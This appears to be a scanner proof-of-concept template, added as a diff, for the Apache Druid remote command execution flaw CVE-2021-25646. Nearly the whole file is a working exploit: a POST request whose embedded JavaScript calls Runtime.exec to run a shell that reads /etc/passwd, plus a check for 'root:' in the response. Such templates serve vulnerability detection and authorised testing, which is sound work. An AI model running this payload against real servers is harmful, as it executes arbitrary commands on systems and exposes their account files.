@@ -1,0 +1,35 @@
+id: poc-yaml-apache-druid-rce
+info:
+  name: Apache Druid 远程命令执行漏洞(CVE-2021-25646)
+  severity: critical
+  tags:
+  - 两高一弱
+  - rce
+  - CVE-2021-25646
+  finger: druid
+requests:
+- method: POST
+  path: /druid/indexer/v1/sampler
+  headers:
+    Content-Type: application/json
+  data: "{\n\"type\":\"index\",\n\"spec\":{\n\"ioConfig\":{\n\"type\":\"index\",\n\
+    \"firehose\":{\n   \"type\":\"local\",\n   \"baseDir\":\"/etc\",\n   \"filter\"\
+    :\"passwd\"\n}\n},\n\"dataSchema\":{\n\"dataSource\":\"odgjxrrrePz\",\n\"parser\"\
+    :{\n   \"parseSpec\":{\n      \"format\":\"javascript\",\n      \"timestampSpec\"\
+    :{\n      },\n      \"dimensionsSpec\":{\n      },\n      \"function\":\"function(){var\
+    \ hTVCCerYZ = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\\\"/bin/sh`@~-c`@~cat\
+    \ /etc/passwd\\\".split(\\\"`@~\\\")).getInputStream()).useDelimiter(\\\"\\\\\
+    A\\\").next();return {timestamp:\\\"4137368\\\",OQtGXcxBVQVL: hTVCCerYZ}}\",\n\
+    \      \"\":{\n         \"enabled\":\"true\"\n      }\n   }\n}\n}\n},\n\"samplerConfig\"\
+    :{\n\"numRows\":10\n}\n}\n"
+  expression: 'status_code == 200
+
+    && contains(body,"root:")
+
+    && contains(body,"/bin")
+
+    && !contains(body,"<")
+
+    '
+variables: {}
+transport: http
